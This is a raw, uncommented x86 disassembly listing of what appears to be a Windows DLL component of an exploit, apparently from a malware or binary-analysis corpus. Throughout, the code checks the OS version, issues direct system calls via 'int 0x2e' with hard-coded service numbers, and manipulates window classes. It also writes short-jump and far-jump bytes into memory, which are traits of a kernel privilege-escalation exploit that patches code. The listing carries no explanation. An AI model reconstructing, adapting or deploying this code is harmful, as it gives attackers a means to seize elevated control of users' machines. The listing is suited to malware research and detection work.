mov [ ebp - 0x134 ] edi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop edi
mov [ ebp - 0x98 ] edi
cmp [ ebp - 0x130 ] 0x5
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
cmp [ ebp - 0xa0 ] 0x1
jne r-xdata
cmp [ ebp - 0x12c ] 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000b0ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
cmp [ ebp - 0xa0 ] 0x2
jne r-xdata
mov [ ebp - 0x8c ] 0xa0
jmp r-xdata
cmp [ ebp - 0xa0 ] bx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x8c ] 0xa4
push rw-data
lea eax [ ebp - 0x120 ]
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
mov [ ebp - 0x8c ] 0xa0
jne r-xdata
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
movzx eax [ ebp - 0x8c ]
mov [ ebp - 0x39c ] eax
sub esi eax
and esi 0xffff
mov [ ebp - 0x15c ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0xc
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call memset
push 0x10
push ebx
push esi
call memset
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call memset
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
lea eax [ ebp - 0x38c ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x138 ] eax
mov eax [ ebp + 0x8 ]
add eax 0x500
mov [ ebp - 0x170 ] eax
push 0x8
push 0x1c
push eax
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x256
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x384 ]
sub eax [ ebp - 0x39c ]
and eax 0xffff
mov [ ebp - 0x15c ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call memset
push 0x10
push ebx
push esi
call memset
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x257
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassA@IAT ]
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x8c ] 0xa4
jmp r-xdata
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x1f
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc3
jmp r-xdata
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] edi
xor ebx ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x7c ] 0xffffffc0
push 0x7
lea eax [ ebp - 0x6c ]
push eax
push 0x1
push sub_1000b1d2
push [ ebp - 0x398 ]
push 0x11
push rw-data
call sub_10009835
push 0x8
push 0x4
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x34
test al al
je r-xdata
or [ ebp - 0x7c ] 0xffffffff
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x64
mov eax [ ebp - 0x1c ]
call [ ebp - 0x170 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub_1000b0de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ eax ]
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0x4
push ecx
push eax
push edx
call sub_1000c492
add esp 0x14
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ ebp - 0x20 ] ecx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] eax
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ esi + 0x4c ] 0x1
xor eax eax
xor eax ecx
test eax 0xfffff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ecx ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ecx [ esi + 0x50 ]
lea eax [ eax + ecx * 4 ]
mov [ esi + 0x14 ] eax
mov ecx [ eax ]
mov [ esi + 0x18 ] ecx
push ebx
push 0x4
lea ecx [ esi + 0x40 ]
push ecx
push eax
lea eax [ esi + 0x1c ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x34 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
sub_1000b195
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4c ] 0x1
xor eax eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b1d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000b249
push esi
call sub_1000b2e7
push [ esi + 0x48 ]
push [ esi + 0x44 ]
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b249
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
lea edi [ esi + 0x1c ]
push ebx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4d ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi + 0x18 ]
cmp [ eax ] ebx
je r-xdata
push ebx
push 0x4
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
sub_1000b2e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000b369
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ ebx ]
call [ GetProcAddress@IAT ]
mov edx eax
mov [ ebp - 0x28 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov ebx 0xffbfffff
mov eax [ edi + 0x20 ]
add eax [ ebp - 0x34 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
lea ecx [ eax + edx ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ecx ]
and ecx ebx
mov [ ebp - 0x38 ] ecx
cmp ecx [ ebp - 0x24 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
inc eax
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea edx [ eax + edx + 0x9 ]
mov [ ebp - 0x3c ] edx
mov edx [ edx ]
and edx ebx
mov [ ebp - 0x40 ] edx
mov esi edx
xor esi ecx
test esi 0xfffff000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x64
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
sub_1000b46f
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] bl
call sub_1000beb7
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
call sub_10009bd3
lea eax [ ebp - 0x88 ]
push 0xd
push eax
push 0x7
push sub_1000b6d7
push esi
push 0x17
push rw-data
call sub_10009835
lea eax [ ebp - 0x54 ]
add esi 0xffffff68
mov [ ebp + 0x18 ] eax
lea eax [ ebp - 0x288 ]
and esi 0xffff
push rw-data
push eax
mov [ ebp - 0x54 ] 0x30
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x44 ] esi
call [ wcscpy@IAT ]
lea eax [ ebp - 0x288 ]
push eax
call [ wcslen@IAT ]
mov esi [ LocalAlloc@IAT ]
add esp 0x2c
shl eax 0x1
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0x288 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push 0x8
push ebx
mov [ ebp - 0x6 ] 0x200
mov [ ebp - 0x20 ] eax
call esi
push 0x10
push ebx
mov edi eax
call esi
push 0x8
push ebx
push edi
mov esi eax
call memset
push 0x10
push ebx
push esi
call memset
push 0x8
lea eax [ ebp - 0x10 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x10 ]
add esp 0x24
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x24 ] eax
push eax
push ebx
push ecx
push edx
push esi
push edi
mov eax [ ebp + 0x10 ]
push 0x0
push 0x80
push 0x25a
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov edx esp
int 0x2e
add esp 0x18
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassW@IAT ]
mov eax [ ebp + 0x8 ]
shr eax 0x10
sub eax 0x98
and eax 0xffff
mov esi [ LocalAlloc@IAT ]
push 0x8
push ebx
mov [ ebp - 0x44 ] eax
call esi
push 0x10
push ebx
mov edi eax
call esi
push 0x8
push ebx
push edi
mov esi eax
call memset
push 0x10
push ebx
push esi
call memset
lea eax [ ebp - 0x288 ]
push rw-data
push eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] esi
call [ wcscpy@IAT ]
lea eax [ ebp - 0x288 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
add esp 0x24
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] 0x200
push eax
push ebx
push ecx
push edx
push esi
push edi
mov eax [ ebp + 0x10 ]
push 0x0
push 0x80
push 0x25b
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov edx esp
int 0x2e
add esp 0x18
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassW@IAT ]
or [ ebp + 0x8 ] 0xffffffff
push eax
push ebx
push ecx
push edx
push esi
push edi
mov eax [ ebp + 0x14 ]
push 0x0
push 0x1f
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov edx esp
int 0x2e
add esp 0x1c
mov [ ebp + 0x8 ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x58 ] al
jne r-xdata
pop eax
push 0xffffffc0
jmp r-xdata
sub_1000b6d7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
push [ eax + 0x8 ]
push [ eax + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
call [ eax ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b73a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2e4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
lea eax [ esi + 0x200 ]
mov [ ebp - 0x2f4 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x5c ] 0xea
mov cl al
mov [ ebp - 0x5b ] cl
mov ecx eax
shr ecx 0x8
mov [ ebp - 0x5a ] cl
mov ecx eax
shr ecx 0x10
mov [ ebp - 0x59 ] cl
shr eax 0x18
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x8
mov [ ebp - 0x56 ] bl
mov [ ebp - 0x55 ] 0x90
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9c ] ebx
lea eax [ ebp - 0x9c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000be1b
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000bc1c
push esi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0xd8 ] esi
mov eax esi
shr eax 0x10
mov [ ebp - 0x2e4 ] eax
mov [ ebp - 0x8c ] 0xb0
mov [ ebp - 0xcc ] 0x30
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xc0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
lea eax [ ebp - 0xcc ]
mov [ ebp - 0x94 ] eax
lea eax [ esi - 0xb0 ]
and eax 0xffff
mov [ ebp - 0xbc ] eax
push rw-data
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcslen@IAT ]
add esp 0x28
shl eax 0x1
mov [ ebp - 0xe0 ] ax
mov [ ebp - 0xde ] 0x200
lea eax [ ebp - 0x2e0 ]
mov [ ebp - 0xdc ] eax
lea eax [ ebp - 0xe0 ]
mov [ ebp - 0xd4 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x2f0 ] ebx
push 0x8
push ebx
mov edi [ LocalAlloc@IAT ]
call edi
mov [ ebp - 0x90 ] eax
push 0x10
push ebx
call edi
mov edi eax
mov [ ebp - 0x2f0 ] edi
push 0x8
push ebx
push [ ebp - 0x90 ]
call memset
push 0x10
push ebx
push edi
call memset
push 0x8
push ebx
lea eax [ ebp - 0x2ec ]
push eax
call memset
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] edi
lea eax [ ebp - 0x2ec ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x98 ] eax
add esi 0x500
mov [ ebp - 0xd0 ] esi
push 0x8
push 0x1c
push esi
push 0xa
push rw-data
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25a
push [ ebp - 0x98 ]
push [ ebp - 0xd4 ]
push [ ebp - 0xd4 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0xd0 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x2e4 ]
add eax 0xffffff50
and eax 0xffff
mov [ ebp - 0xbc ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x2f0 ] esi
push 0x8
push ebx
push edi
call memset
push 0x10
push ebx
push esi
call memset
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
push rw-data
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x2e0 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
mov [ ebp - 0xe0 ] ax
mov [ ebp - 0xde ] 0x200
push 0x8
push 0x1c
push [ ebp - 0xd0 ]
push 0xa
push rw-data
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x25b
push [ ebp - 0x98 ]
push [ ebp - 0xd4 ]
push [ ebp - 0xd4 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0xd0 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassA@IAT ]
push 0x8
push 0x1c
push [ ebp - 0xd0 ]
push 0xa
push rw-data
call sub_10009898
push [ ebp - 0x9c ]
call sub_1000c640
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call [ ebp - 0xd0 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc3
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_1000bbf8
mov eax [ ebp - 0x7c ]
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x7c ] 0xffffffc0
push 0x7
lea eax [ ebp - 0x6c ]
push eax
push 0x1
push sub_1000bca8
push [ ebp - 0x2f4 ]
push 0x11
push rw-data
call sub_10009835
push 0x8
push 0x4
push [ ebp - 0xd0 ]
push 0xa
push rw-data
call sub_10009898
push [ ebp - 0x9c ]
call sub_1000c640
add esp 0x34
test al al
je r-xdata
or [ ebp - 0x7c ] 0xffffffff
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x64
mov eax [ ebp - 0x20 ]
call [ ebp - 0xd0 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call sub_1000c640
pop ecx
cmp [ ebp - 0x23 ] 0x0
jne r-xdata
sub_1000bc1c
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x20 ] ecx
xor eax eax
push 0x0
push 0x8
lea eax [ esi + 0x10 ]
push eax
push [ esi + 0x4 ]
lea eax [ esi + 0x18 ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
mov dl [ eax + ecx ]
mov [ eax + esi + 0x8 ] dl
inc eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x48 ] 0x1
mov [ ebp - 0x24 ] eax
cmp eax 0x8
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bca8
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000bd1f
push esi
call sub_1000bd99
push [ esi + 0x44 ]
push [ esi + 0x40 ]
lea eax [ esi + 0x18 ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax 0xc0000061
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd1f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x8
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
push [ esi + 0x4 ]
lea eax [ esi + 0x18 ]
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ esi + 0x49 ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd99
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x18
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000be1b
push ebx
push esi
